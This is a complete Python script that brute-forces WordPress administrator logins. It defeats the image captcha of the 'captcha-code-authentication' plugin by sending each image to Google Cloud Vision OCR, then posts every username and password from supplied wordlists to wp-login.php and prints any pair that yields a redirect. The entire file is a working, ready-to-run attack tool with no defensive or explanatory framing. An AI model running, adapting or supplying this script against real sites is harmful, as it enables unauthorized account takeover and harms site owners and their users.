import requests
import random
import string
from google.cloud import vision

def fetch_and_save_image(target_url, sess_id=None):
    if sess_id is None:
        sess_id = ''.join(random.choices(string.ascii_letters + string.digits, k=26))
    url = f"{target_url}/wp-content/plugins/captcha-code-authentication/captcha_code_file.php"
    params = {"rand": random.randint(1000000000, 9999999999)}
    cookies = {"PHPSESSID": sess_id, "wordpress_test_cookie": "WP Cookie check"}
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
        "Accept": "image/avif,image/webp,*/*",
        "Accept-Language": "en-US,ar;q=0.7,en;q=0.3",
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": f"{target_url}/wp-login.php?redirect_to={target_url}/wp-admin/&reauth=1",
        "Sec-Fetch-Dest": "image",
        "Sec-Fetch-Mode": "no-cors",
        "Sec-Fetch-Site": "same-origin",
        "Te": "trailers",
        "Connection": "close"
    }
    response = requests.get(url, params=params, headers=headers, cookies=cookies)
    if response.headers['Content-Type'] == 'image/jpeg':
        image_path = 'captcha.jpg'
        with open(image_path, 'wb') as f:
            f.write(response.content)
        return image_path, sess_id
    else:
        print("Failed to receive an image response.")
        return None, sess_id

def detect_text(image_path):
    client = vision.ImageAnnotatorClient()
    with open(image_path, 'rb') as image_file:
        content = image_file.read()
    image = vision.Image(content=content)
    response = client.text_detection(image=image)
    texts = response.text_annotations
    if texts:
        text = texts[0].description.strip()
        if text.isdigit() and len(text) == 6:
            return text
    return None

def submit_login_form(target_url, sess_id, username, password, captcha_text):
    url = f"{target_url}/wp-login.php"
    data = {
        "log": username,
        "pwd": password,
        "captcha_code": captcha_text,
        "wp-submit": "Log In",
        "redirect_to": f"{target_url}/wp-admin/",
        "testcookie": "1"
    }
    cookies = {"PHPSESSID": sess_id, "wordpress_test_cookie": "WP Cookie check"}
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,ar;q=0.7,en;q=0.3",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": f"{target_url}/wp-login.php",
        "Origin": target_url,
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Te": "trailers"
    }
    response = requests.post(url, data=data, cookies=cookies, headers=headers)
    return response

def read_credentials(usernames_file, passwords_file):
    with open(usernames_file, "r") as file:
        usernames = [line.strip() for line in file.readlines()]
    with open(passwords_file, "r") as file:
        passwords = [line.strip() for line in file.readlines()]
    return usernames, passwords

if __name__ == "__main__":
    target_url = input("Enter the target URL (e.g., https://www.example.com): ")
    usernames_file = input("Enter the path to the usernames file: ")
    passwords_file = input("Enter the path to the passwords file: ")
    usernames, passwords = read_credentials(usernames_file, passwords_file)
    for username in usernames:
        for password in passwords:
            sess_id = None
            image_path, sess_id = fetch_and_save_image(target_url, sess_id)
            if image_path and sess_id:
                captcha_text = detect_text(image_path)
                if captcha_text:
                    response = submit_login_form(target_url, sess_id, username, password, captcha_text)
                    if response.status_code in [301, 302] or "Location" in response.headers:
                        print(f"Correct credentials found: {username} / {password}")
                        break  # Correct credentials found, no need to try more passwords for this username
                    else:
                        print(f"Attempt with {username} / {password} failed.")
                else:
                    print("Invalid captcha format, retrying...")
            else:
                print("Failed to fetch the captcha image.")
                continue  # Skip to the next username/password combination
